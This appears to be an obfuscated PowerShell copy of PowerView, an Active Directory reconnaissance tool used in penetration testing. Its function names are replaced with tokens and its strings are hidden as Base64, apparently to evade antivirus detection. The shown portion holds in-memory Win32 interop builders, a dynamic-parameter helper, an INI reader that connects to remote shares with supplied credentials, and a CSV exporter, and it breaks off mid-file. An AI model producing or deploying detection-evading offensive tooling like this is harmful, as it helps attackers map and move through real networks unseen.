
function f66 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f60} = [Guid]::NewGuid().ToString()
    )
    ${609} = [Reflection.Assembly].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBBAHAAcABEAG8AbQBhAGkAbgA=')))).GetProperty($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwB1AHIAcgBlAG4AdABEAG8AbQBhAGkAbgA=')))).GetValue($null, @())
    ${611} = ${609}.GetAssemblies()
    foreach (${610} in ${611}) {
        if (${610}.FullName -and (${610}.FullName.Split(',')[0] -eq ${f60})) {
            return ${610}
        }
    }
    ${608} = New-Object Reflection.AssemblyName(${f60})
    $Domain = ${609}
    ${607} = $Domain.DefineDynamicAssembly(${608}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4A'))))
    ${606} = ${607}.DefineDynamicModule(${f60}, $False)
    return ${606}
}
function f62 {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        ${f53},
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        ${f54},
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        ${f58},
        [Parameter(Position = 3)]
        [Type[]]
        ${f57},
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${f52},
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        ${f51},
        [String]
        ${f55},
        [Switch]
        ${f56}
    )
    $Properties = @{
        DllName = ${f53}
        FunctionName = ${f54}
        ReturnType = ${f58}
    }
    if (${f57}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAYQBtAGUAdABlAHIAVAB5AHAAZQBzAA==')))] = ${f57} }
    if (${f52}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUAQwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA==')))] = ${f52} }
    if (${f51}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBzAGUAdAA=')))] = ${f51} }
    if (${f56}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA')))] = ${f56} }
    if (${f55}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAcgB5AFAAbwBpAG4AdAA=')))] = ${f55} }
    New-Object PSObject -Property $Properties
}
function f61
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        ${f53},
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        ${f54},
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        ${f55},
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        ${f58},
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        ${f57},
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        ${f52} = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        ${f51} = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        ${f56},
        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${f48},
        [ValidateNotNull()]
        [String]
        ${f59} = ''
    )
    BEGIN
    {
        ${596} = @{}
    }
    PROCESS
    {
        if (${f48} -is [Reflection.Assembly])
        {
            if (${f59})
            {
                ${596}[${f53}] = ${f48}.GetType($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGYANQA5AH0ALgAkAHsAZgA1ADMAfQA='))))
            }
            else
            {
                ${596}[${f53}] = ${f48}.GetType(${f53})
            }
        }
        else
        {
            if (!${596}.ContainsKey(${f53}))
            {
                if (${f59})
                {
                    ${596}[${f53}] = ${f48}.DefineType($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGYANQA5AH0ALgAkAHsAZgA1ADMAfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                }
                else
                {
                    ${596}[${f53}] = ${f48}.DefineType(${f53}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                }
            }
            $Method = ${596}[${f53}].DefineMethod(
                ${f54},
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAsAFAAaQBuAHYAbwBrAGUASQBtAHAAbAA='))),
                ${f58},
                ${f57})
            ${67} = 1
            foreach(${559} in ${f57})
            {
                if (${559}.IsByRef)
                {
                    [void] $Method.DefineParameter(${67}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQA'))), $null)
                }
                ${67}++
            }
            ${605} = [Runtime.InteropServices.DllImportAttribute]
            ${603} = ${605}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA'))))
            ${602} = ${605}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA=='))))
            ${601} = ${605}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBTAGUAdAA='))))
            ${600} = ${605}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAcgB5AFAAbwBpAG4AdAA='))))
            if (${f56}) { ${599} = $True } else { ${599} = $False }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAcgB5AFAAbwBpAG4AdAA=')))]) { ${598} = ${f55} } else { ${598} = ${f54} }
            ${604} = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            ${597} = New-Object Reflection.Emit.CustomAttributeBuilder(${604},
                ${f53}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${603},
                                           ${602},
                                           ${601},
                                           ${600}),
                [Object[]] @(${599},
                             ([Runtime.InteropServices.CallingConvention] ${f52}),
                             ([Runtime.InteropServices.CharSet] ${f51}),
                             ${598}))
            $Method.SetCustomAttribute(${597})
        }
    }
    END
    {
        if (${f48} -is [Reflection.Assembly])
        {
            return ${596}
        }
        ${595} = @{}
        foreach (${105} in ${596}.Keys)
        {
            ${f19} = ${596}[${105}].CreateType()
            ${595}[${105}] = ${f19}
        }
        return ${595}
    }
}
function f65 {
    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${f48},
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f47},
        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        ${f19},
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${f49},
        [Switch]
        ${f50}
    )
    if (${f48} -is [Reflection.Assembly])
    {
        return (${f48}.GetType(${f47}))
    }
    ${592} = ${f19} -as [Type]
    ${591} = ${f48}.DefineEnum(${f47}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), ${592})
    if (${f50})
    {
        ${594} = [FlagsAttribute].GetConstructor(@())
        ${593} = New-Object Reflection.Emit.CustomAttributeBuilder(${594}, @())
        ${591}.SetCustomAttribute(${593})
    }
    foreach (${105} in ${f49}.Keys)
    {
        $null = ${591}.DefineLiteral(${105}, ${f49}[${105}] -as ${592})
    }
    ${591}.CreateType()
}
function f63 {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        ${f42},
        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        ${f19},
        [Parameter(Position = 2)]
        [UInt16]
        ${f1},
        [Object[]]
        ${f44}
    )
    @{
        Position = ${f42}
        Type = ${f19} -as [Type]
        Offset = ${f1}
        MarshalAs = ${f44}
    }
}
function f64
{
    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${f48},
        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f47},
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${f45},
        [Reflection.Emit.PackingSize]
        ${f46} = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        ${f43}
    )
    if (${f48} -is [Reflection.Assembly])
    {
        return (${f48}.GetType(${f47}))
    }
    [Reflection.TypeAttributes] ${590} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAHMAaQBDAGwAYQBzAHMALAANAAoAIAAgACAAIAAgACAAIAAgAEMAbABhAHMAcwAsAA0ACgAgACAAIAAgACAAIAAgACAAUAB1AGIAbABpAGMALAANAAoAIAAgACAAIAAgACAAIAAgAFMAZQBhAGwAZQBkACwADQAKACAAIAAgACAAIAAgACAAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    if (${f43})
    {
        ${590} = ${590} -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        ${590} = ${590} -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    ${575} = ${f48}.DefineType(${f47}, ${590}, [ValueType], ${f46})
    ${583} = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    ${585} = @([Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
    ${589} = New-Object Hashtable[](${f45}.Count)
    foreach (${588} in ${f45}.Keys)
    {
        ${53} = ${f45}[${588}][$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHMAaQB0AGkAbwBuAA==')))]
        ${589}[${53}] = @{FieldName = ${588}; Properties = ${f45}[${588}]}
    }
    foreach (${588} in ${589})
    {
        ${586} = ${588}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGUAbABkAE4AYQBtAGUA')))]
        ${587} = ${588}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
        ${f1} = ${587}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA')))]
        ${f19} = ${587}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAB5AHAAZQA=')))]
        ${f44} = ${587}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHIAcwBoAGEAbABBAHMA')))]
        ${580} = ${575}.DefineField(${586}, ${f19}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        if (${f44})
        {
            ${582} = ${f44}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${f44}[1])
            {
                ${584} = ${f44}[1]
                ${581} = New-Object Reflection.Emit.CustomAttributeBuilder(${583},
                    ${582}, ${585}, @(${584}))
            }
            else
            {
                ${581} = New-Object Reflection.Emit.CustomAttributeBuilder(${583}, [Object[]] @(${582}))
            }
            ${580}.SetCustomAttribute(${581})
        }
        if (${f43}) { ${580}.SetOffset(${f1}) }
    }
    ${579} = ${575}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwBpAHoAZQA='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
        [Int],
        [Type[]] @())
    ${578} = ${579}.GetILGenerator()
    ${578}.Emit([Reflection.Emit.OpCodes]::Ldtoken, ${575})
    ${578}.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    ${578}.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYA'))), [Type[]] @([Type])))
    ${578}.Emit([Reflection.Emit.OpCodes]::Ret)
    ${577} = ${575}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAF8ASQBtAHAAbABpAGMAaQB0AA=='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQBTAGMAbwBwAGUALAAgAFAAdQBiAGwAaQBjACwAIABTAHQAYQB0AGkAYwAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFMAcABlAGMAaQBhAGwATgBhAG0AZQA='))),
        ${575},
        [Type[]] @([IntPtr]))
    ${576} = ${577}.GetILGenerator()
    ${576}.Emit([Reflection.Emit.OpCodes]::Nop)
    ${576}.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    ${576}.Emit([Reflection.Emit.OpCodes]::Ldtoken, ${575})
    ${576}.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    ${576}.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB0AHIAVABvAFMAdAByAHUAYwB0AHUAcgBlAA=='))), [Type[]] @([IntPtr], [Type])))
    ${576}.Emit([Reflection.Emit.OpCodes]::Unbox_Any, ${575})
    ${576}.Emit([Reflection.Emit.OpCodes]::Ret)
    ${575}.CreateType()
}
Function f115 {
    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]${f19} = [int],
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]${501},
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$Mandatory,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]${f42},
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$HelpMessage,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$DontShow,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipeline,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipelineByPropertyName,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromRemainingArguments,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$ParameterSetName = '__AllParameterSets',
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowNull,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyString,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyCollection,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNull,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNullOrEmpty,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateCount,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateRange,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateLength,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$ValidatePattern,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$ValidateScript,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$ValidateSet,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGMAdABpAG8AbgBhAHIAeQAgAG0AdQBzAHQAIABiAGUAIABhACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFIAdQBuAHQAaQBtAGUARABlAGYAaQBuAGUAZABQAGEAcgBhAG0AZQB0AGUAcgBEAGkAYwB0AGkAbwBuAGEAcgB5ACAAbwBiAGoAZQBjAHQA')))
            }
            $true
        })]
        $Dictionary = $false,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$CreateVariables,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if($_.GetType().Name -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGMAdABpAG8AbgBhAHIAeQA=')))) {
                Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAFAAYQByAGEAbQBlAHQAZQByAHMAIABtAHUAcwB0ACAAYgBlACAAYQAgAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBQAFMAQgBvAHUAbgBkAFAAYQByAGEAbQBlAHQAZQByAHMARABpAGMAdABpAG8AbgBhAHIAeQAgAG8AYgBqAGUAYwB0AA==')))
            }
            $true
        })]
        $BoundParameters
    )
    Begin {
        ${568} = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        ${574} = (gcm _temp).Parameters.Keys
    }
    Process {
        if($CreateVariables) {
            ${573} = $BoundParameters.Keys | ? { ${574} -notcontains $_ }
            ForEach(${559} in ${573}) {
                if (${559}) {
                    sv -Name ${559} -Value $BoundParameters.${559} -Scope 1 -Force
                }
            }
        }
        else {
            ${572} = @()
            ${572} = $PSBoundParameters.GetEnumerator() |
                        % {
                            if($_.Value.PSobject.Methods.Name -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBFAHEAdQBhAGwAcwAkAA==')))) {
                                if(!$_.Value.Equals((gv -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                if($_.Value -ne (gv -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if(${572}) {
                ${572} | % {[void]$PSBoundParameters.Remove($_)}
            }
            ${571} = (gcm -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        ? { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            select -ExpandProperty Key |
                                                ? { $PSBoundParameters.Keys -notcontains $_ }
            ${570} = $null
            ForEach (${559} in ${571}) {
                ${569} = gv -Name ${559} -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue(${559}, [ref]${570}) -and ${569}) {
                    $PSBoundParameters.${559} = ${569}
                }
            }
            if($Dictionary) {
                ${558} = $Dictionary
            }
            else {
                ${558} = ${568}
            }
            ${563} = {gv -Name $_ -ValueOnly -Scope 0}
            ${567} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAE0AYQBuAGQAYQB0AG8AcgB5AHwAUABvAHMAaQB0AGkAbwBuAHwAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQB8AEQAbwBuAHQAUwBoAG8AdwB8AEgAZQBsAHAATQBlAHMAcwBhAGcAZQB8AFYAYQBsAHUAZQBGAHIAbwBtAFAAaQBwAGUAbABpAG4AZQB8AFYAYQBsAHUAZQBGAHIAbwBtAFAAaQBwAGUAbABpAG4AZQBCAHkAUAByAG8AcABlAHIAdAB5AE4AYQBtAGUAfABWAGEAbAB1AGUARgByAG8AbQBSAGUAbQBhAGkAbgBpAG4AZwBBAHIAZwB1AG0AZQBuAHQAcwApACQA')))
            ${566} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAEEAbABsAG8AdwBOAHUAbABsAHwAQQBsAGwAbwB3AEUAbQBwAHQAeQBTAHQAcgBpAG4AZwB8AEEAbABsAG8AdwBFAG0AcAB0AHkAQwBvAGwAbABlAGMAdABpAG8AbgB8AFYAYQBsAGkAZABhAHQAZQBDAG8AdQBuAHQAfABWAGEAbABpAGQAYQB0AGUATABlAG4AZwB0AGgAfABWAGEAbABpAGQAYQB0AGUAUABhAHQAdABlAHIAbgB8AFYAYQBsAGkAZABhAHQAZQBSAGEAbgBnAGUAfABWAGEAbABpAGQAYQB0AGUAUwBjAHIAaQBwAHQAfABWAGEAbABpAGQAYQB0AGUAUwBlAHQAfABWAGEAbABpAGQAYQB0AGUATgBvAHQATgB1AGwAbAB8AFYAYQBsAGkAZABhAHQAZQBOAG8AdABOAHUAbABsAE8AcgBFAG0AcAB0AHkAKQAkAA==')))
            ${564} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBBAGwAaQBhAHMAJAA=')))
            ${561} = New-Object -TypeName System.Management.Automation.ParameterAttribute
            switch -regex ($PSBoundParameters.Keys) {
                ${567} {
                    Try {
                        ${561}.$_ = . ${563}
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }
            if(${558}.Keys -contains $Name) {
                ${558}.$Name.Attributes.Add(${561})
            }
            else {
                ${560} = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    ${566} {
                        Try {
                            ${565} = New-Object -TypeName $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACQAewBfAH0AQQB0AHQAcgBpAGIAdQB0AGUA'))) -ArgumentList (. ${563}) -ErrorAction Stop
                            ${560}.Add(${565})
                        }
                        Catch { $_ }
                        continue
                    }
                    ${564} {
                        Try {
                            ${562} = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. ${563}) -ErrorAction Stop
                            ${560}.Add(${562})
                            continue
                        }
                        Catch { $_ }
                    }
                }
                ${560}.Add(${561})
                ${559} = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, ${f19}, ${560})
                ${558}.Add($Name, ${559})
            }
        }
    }
    End {
        if(!$CreateVariables -and !$Dictionary) {
            ${558}
        }
    }
}
function f105 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        ${f17}
    )
    BEGIN {
        ${150} = @{}
    }
    PROCESS {
        ForEach (${154} in $Path) {
            if ((${154} -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ${155} = (New-Object System.Uri(${154})).Host
                if (-not ${150}[${155}]) {
                    f93 -94 ${155} -Credential $Credential
                    ${150}[${155}] = $True
                }
            }
            if (Test-Path -Path ${154}) {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                    ${553} = New-Object PSObject
                }
                else {
                    ${553} = @{}
                }
                Switch -Regex -File ${154} {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcAFsAKAAuACsAKQBcAF0A'))) 
                    {
                        ${555} = $matches[1].Trim()
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                            ${555} = ${555}.Replace(' ', '')
                            ${557} = New-Object PSObject
                            ${553} | Add-Member Noteproperty ${555} ${557}
                        }
                        else {
                            ${553}[${555}] = @{}
                        }
                        ${556} = 0
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoADsALgAqACkAJAA='))) 
                    {
                        ${177} = $matches[1].Trim()
                        ${556} = ${556} + 1
                        $Name = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))) + ${556}
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                            $Name = $Name.Replace(' ', '')
                            ${553}.${555} | Add-Member Noteproperty $Name ${177}
                        }
                        else {
                            ${553}[${555}][$Name] = ${177}
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuACsAPwApAFwAcwAqAD0AKAAuACoAKQA='))) 
                    {
                        $Name, ${177} = $matches[1..2]
                        $Name = $Name.Trim()
                        ${554} = ${177}.split(',') | % { $_.Trim() }
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                            $Name = $Name.Replace(' ', '')
                            ${553}.${555} | Add-Member Noteproperty $Name ${554}
                        }
                        else {
                            ${553}[${555}][$Name] = ${554}
                        }
                    }
                }
                ${553}
            }
        }
    }
    END {
        ${150}.Keys | f91
    }
}
function Export-PowerViewCSV {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $InputObject,
        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,
        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $Delimiter = ',',
        [Switch]
        $Append
    )
    BEGIN {
        ${552} = [IO.Path]::GetFullPath($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))])
        ${550} = [System.IO.File]::Exists(${552})
        ${548} = New-Object System.Threading.Mutex $False,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBTAFYATQB1AHQAZQB4AA==')))
        $Null = ${548}.WaitOne()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAZQBuAGQA')))]) {
            ${551} = [System.IO.FileMode]::Append
        }
        else {
            ${551} = [System.IO.FileMode]::Create
            ${550} = $False
        }
        ${546} = New-Object IO.FileStream(${552}, ${551}, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        ${547} = New-Object System.IO.StreamWriter(${546})
        ${547}.AutoFlush = $True
    }
    PROCESS {
        ForEach (${441} in $InputObject) {
            ${549} = ConvertTo-Csv -InputObject ${441} -Delimiter $Delimiter -NoTypeInformation
            if (-not ${550}) {
                ${549} | % { ${547}.WriteLine($_) }
                ${550} = $True
            }
            else {
                ${549}[1..(${549}.Length-1)] | % { ${547}.WriteLine($_) }
            }
        }
    }
    END {
        ${548}.ReleaseMutex()
        ${547}.Dispose()
        ${546}.Dispose()
    }
}
function f87 {
